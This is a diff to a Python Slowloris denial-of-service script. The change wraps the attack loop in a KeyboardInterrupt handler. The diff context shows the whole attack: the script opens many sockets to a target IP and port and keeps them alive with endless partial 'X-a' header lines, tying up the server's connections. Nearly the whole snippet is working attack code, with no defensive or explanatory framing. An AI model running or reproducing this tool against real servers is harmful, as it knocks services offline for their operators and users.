@@ -14,23 +14,26 @@ def create_socket(IP, port):
 def slowloris(IP, port, socket_count):
 
     # TODO use argv to pass in IP and port and socket count
-    
-    while True:
+    try:
+        while True:
 
-        # Make sure there are still socket_count sockets
-        for i in range(socket_count - len(sockets)):
-            try:
-                s = create_socket(IP, port)
-                sockets.append(s)
-            except:
-                print("socket could not be established")
-                break
+            # Make sure there are still socket_count sockets
+            for i in range(socket_count - len(sockets)):
+                try:
+                    s = create_socket(IP, port)
+                    sockets.append(s)
+                except:
+                    print("socket could not be established")
+                    break
 
-        for s in sockets:
-            try:
-                s.send(f"X-a {random.randint(1,255)}\r\n")
-            except:
-                sockets.remove(s)
+            for s in sockets:
+                try:
+                    s.send(f"X-a {random.randint(1,255)}\r\n")
+                except:
+                    sockets.remove(s)
+    except (KeyboardInterrupt, SystemExit):
+        print("Stopping slowloris")
+        
 
 if __name__ == "__main__":
 
